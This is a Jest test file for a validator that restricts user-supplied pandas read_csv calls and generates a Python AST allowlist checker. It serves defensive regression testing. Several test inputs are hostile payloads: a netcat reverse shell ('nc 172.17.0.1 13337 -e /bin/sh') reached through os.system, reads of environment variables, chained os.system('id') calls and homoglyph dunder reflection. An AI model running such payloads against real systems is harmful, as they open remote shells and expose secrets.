import { validateReadCSVInput, buildASTCheckerCode } from './pythonCodeValidator'

// ---------------------------------------------------------------------------
// buildASTCheckerCode — verify the generated Python script structure
// ---------------------------------------------------------------------------

describe('buildASTCheckerCode', () => {
    it('should include all default allowed pd attrs in the generated script', () => {
        const code = buildASTCheckerCode([])
        const defaults = [
            'isna',
            'notna',
            'isnull',
            'notnull',
            'to_datetime',
            'to_numeric',
            'to_timedelta',
            'NA',
            'NaT',
            'concat',
            'merge',
            'get_dummies',
            'json_normalize',
            'melt',
            'pivot_table',
            'crosstab'
        ]
        for (const name of defaults) {
            expect(code).toContain(`'${name}'`)
        }
    })

    it('should include extra allowed functions when provided', () => {
        const code = buildASTCheckerCode(['read_json', 'read_html'])
        expect(code).toContain("'read_json'")
        expect(code).toContain("'read_html'")
    })

    it('should silently ignore extra functions with invalid Python identifiers', () => {
        const code = buildASTCheckerCode(['valid_func', '123invalid', 'also-invalid'])
        expect(code).toContain("'valid_func'")
        expect(code).not.toContain("'123invalid'")
        expect(code).not.toContain("'also-invalid'")
    })

    it('should include the AST import and AllowlistChecker class', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain('import ast as _ast')
        expect(code).toContain('class _AllowlistChecker')
        expect(code).toContain('_ast.parse(_user_code_to_check)')
    })

    it('should block imports via visit_Import and visit_ImportFrom', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain('def visit_Import')
        expect(code).toContain('def visit_ImportFrom')
    })

    it('should track pd aliases via visit_Assign', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain('self._pd_aliases')
        expect(code).toContain('def visit_Assign')
    })

    it('should block dunder attributes via visit_Attribute', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain("node.attr.startswith('__') and node.attr.endswith('__')")
    })

    it('should clean up internal names in finally block', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain('finally:')
        expect(code).toContain(
            'del _ast, _ALLOWED_PD_ATTRS, _FORBIDDEN_CALL_NAMES, _FORBIDDEN_NP_SUBMODULES, _FORBIDDEN_METHODS, _FILE_WRITE_METHODS, _PATH_KEYWORDS, _attr_root, _has_write_target, _AllowlistChecker, _checker_instance'
        )
        expect(code).toContain('del _user_code_to_check')
    })

    it('should include known forbidden builtins', () => {
        const code = buildASTCheckerCode([])
        const forbidden = ['eval', 'exec', 'compile', '__import__', 'open', 'globals', 'locals', 'getattr']
        for (const name of forbidden) {
            expect(code).toContain(`'${name}'`)
        }
    })

    it('should block bare references to forbidden builtins and dunder names via visit_Name', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain('def visit_Name')
        expect(code).toContain('node.id in _FORBIDDEN_CALL_NAMES')
        expect(code).toContain("node.id.startswith('__') and node.id.endswith('__')")
    })

    it('should track np aliases and block dangerous numpy submodules', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain('self._np_aliases')
        expect(code).toContain('_FORBIDDEN_NP_SUBMODULES')
        expect(code).toContain("'ctypeslib'")
    })

    it('should block string-evaluating, deserializing, and sink methods on any receiver', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain('_FORBIDDEN_METHODS')
        for (const method of ['query', 'eval', 'pipe', 'to_pickle', 'read_pickle', 'to_sql', 'to_gbq', 'to_clipboard']) {
            expect(code).toContain(`'${method}'`)
        }
    })

    it('should block file-writing IO methods when given a write target', () => {
        const code = buildASTCheckerCode([])
        expect(code).toContain('_FILE_WRITE_METHODS')
        expect(code).toContain('_has_write_target')
        for (const method of ['to_csv', 'to_json', 'to_excel', 'to_html', 'to_parquet']) {
            expect(code).toContain(`'${method}'`)
        }
        for (const kw of ['path_or_buf', 'buf', 'excel_writer']) {
            expect(code).toContain(`'${kw}'`)
        }
    })
})

// ---------------------------------------------------------------------------
// validateReadCSVInput — carried over from validateCustomReadCSVFunction tests
// ---------------------------------------------------------------------------

describe('validateReadCSVInput', () => {
    describe('legitimate read_csv calls pass validation', () => {
        it('should allow the default read_csv(csv_data) call', () => {
            expect(validateReadCSVInput('read_csv(csv_data)').valid).toBe(true)
        })

        it('should allow literal keyword options', () => {
            const result = validateReadCSVInput("read_csv(csv_data, sep=';', header=0, keep_default_na=False)")
            expect(result.valid).toBe(true)
        })

        it('should allow spaces around keyword equals', () => {
            const result = validateReadCSVInput("read_csv(csv_data, sep = ';', header = 0)")
            expect(result.valid).toBe(true)
        })

        it('should allow statement separator characters inside string literals', () => {
            const result = validateReadCSVInput("read_csv(csv_data, sep=';', lineterminator='\\n')")
            expect(result.valid).toBe(true)
        })

        it('should allow literal lists, tuples, and dictionaries for read_csv options', () => {
            const result = validateReadCSVInput("read_csv(csv_data, usecols=['Name', 'Age'], na_values={'Age': ['NA', '']})")
            expect(result.valid).toBe(true)
        })

        it('should allow spaces around dictionary colons and a trailing dictionary comma', () => {
            const result = validateReadCSVInput("read_csv(csv_data, na_values={'Age' : ['NA'],})")
            expect(result.valid).toBe(true)
        })

        it('should allow filepath_or_buffer=csv_data as the explicit source', () => {
            const result = validateReadCSVInput("read_csv(filepath_or_buffer=csv_data, encoding='utf-8')")
            expect(result.valid).toBe(true)
        })
    })

    describe('code execution bypasses are blocked', () => {
        it('should block the reported walrus tuple bypass in the read_csv source argument', () => {
            const result = validateReadCSVInput('read_csv((_m := pd.io.common.os, _m.system("/usr/bin/nc 172.17.0.1 13337 -e /bin/sh")))')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('read from csv_data directly')
        })

        it('should block dangerous attribute access in read_csv keyword values', () => {
            const result = validateReadCSVInput('read_csv(csv_data, storage_options=pd.io.common.os.environ)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('option values must be')
        })

        it('should block nested function calls in read_csv keyword values', () => {
            const result = validateReadCSVInput("read_csv(csv_data, sep=str(','))")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('option values must be')
        })

        it('should block lambda converters in read_csv keyword values', () => {
            const result = validateReadCSVInput("read_csv(csv_data, converters={'Name': lambda value: value})")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('option values must be')
        })

        it('should block positional arguments after csv_data', () => {
            const result = validateReadCSVInput("read_csv(csv_data, ';')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('keyword arguments')
        })

        it('should block empty arguments', () => {
            const result = validateReadCSVInput('read_csv(csv_data,, header=0)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('empty arguments')
        })

        it('should block a trailing comma', () => {
            const result = validateReadCSVInput('read_csv(csv_data, header=0,)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('empty arguments')
        })

        it('should block duplicate keyword arguments', () => {
            const result = validateReadCSVInput("read_csv(csv_data, sep=',', sep=';')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('duplicated')
        })

        it('should block duplicate filepath_or_buffer when source is named', () => {
            const result = validateReadCSVInput("read_csv(filepath_or_buffer=csv_data, filepath_or_buffer='other.csv')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('duplicated')
        })

        it('should block filepath_or_buffer override when source is positional', () => {
            const result = validateReadCSVInput("read_csv(csv_data, filepath_or_buffer='other.csv')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('duplicated')
        })

        it('should block malformed bracket nesting', () => {
            const result = validateReadCSVInput("read_csv(csv_data, usecols=['Name', 'Age')")
            expect(result.valid).toBe(false)
        })

        it('should block top-level semicolon statement chaining', () => {
            const result = validateReadCSVInput("read_csv(csv_data); pd.io.common.os.system('id')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('single function call')
        })

        it('should block overlong custom read_csv input', () => {
            const result = validateReadCSVInput(`read_csv(csv_data, sep='${'a'.repeat(1024)}')`)
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('1024 characters or fewer')
        })

        it('should block trailing code after the read_csv call', () => {
            const result = validateReadCSVInput("read_csv(csv_data) or pd.io.common.os.system('id')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('exactly one complete')
        })

        it('should block homoglyph reflection chained onto a single-line read_csv call', () => {
            const result = validateReadCSVInput('read_csv(csv_data).__cl\u{1D41A}ss__')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('exactly one complete')
        })

        it('should block a multi-line homoglyph payload smuggled into the custom read_csv field', () => {
            const payload = 'read_csv(csv_data)\ncls = ().__cl\u{1D41A}ss__'
            const result = validateReadCSVInput(payload)
            expect(result.valid).toBe(false)
        })

        it('should still allow a benign read_csv even when spelled with a homoglyph (normalized to ASCII)', () => {
            const result = validateReadCSVInput('r\u212Fad_csv(csv_data)')
            expect(result.valid).toBe(true)
        })
    })
})
